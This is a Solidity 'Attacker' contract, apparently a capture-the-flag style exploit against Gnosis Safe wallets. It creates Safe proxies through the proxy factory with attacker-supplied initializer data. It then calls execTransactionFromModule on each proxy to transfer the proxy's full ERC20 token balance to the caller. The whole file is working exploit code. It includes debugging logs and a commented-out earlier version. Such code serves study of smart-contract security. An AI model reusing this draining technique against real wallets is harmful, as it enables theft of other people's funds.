// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "hardhat/console.sol";

abstract contract Enum {
    enum Operation {
        Call,
        DelegateCall
    }
}

interface ISafe {
    function execTransactionFromModule(
        address to,
        uint256 value,
        bytes calldata data,
        Enum.Operation operation
    ) external returns (bool success);
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract Attacker {
    // constructor(address token, address proxy_factory) {
    //     _token = token;
    //     _factory = proxy_factory;
    // }

    function attack(
        bytes[] calldata dataList,
        address token,
        address proxy_factory
    ) external {
        //  function createProxyWithCallback(
        //         address _singleton,
        //         bytes memory initializer,
        //         uint256 saltNonce,
        //         IProxyCreationCallback callback
        //     )
        // _factory.call
        bool success;
        bytes memory data;
        for (uint256 i = 0; i < dataList.length; i++) {
            (success, data) = proxy_factory.call(dataList[i]);
            require(success, "createProxy failed");

            // convert bytes to address
            address proxy = address(uint160(uint256(bytes32(data))));

            console.log("proxy", i, proxy);
            console.log("blance of token", IERC20(token).balanceOf(proxy));

            ISafe(proxy).execTransactionFromModule(
                token,
                0,
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    msg.sender,
                    IERC20(token).balanceOf(proxy)
                ),
                Enum.Operation.Call
            );
        }
    }

    // function attack(address[] calldata list, address receiver) external {
    //     for (uint256 i = 0; i < list.length; i++) {
    //         ISafe(list[i]).execTransactionFromModule(
    //             _token,
    //             0,
    //             abi.encodeWithSignature(
    //                 "transfer(address,uint256)",
    //                 receiver,
    //                 IERC20(_token).blanceOf(list[i])
    //             ),
    //             Enum.Operation.Call
    //         );
    //     }
    // }
}
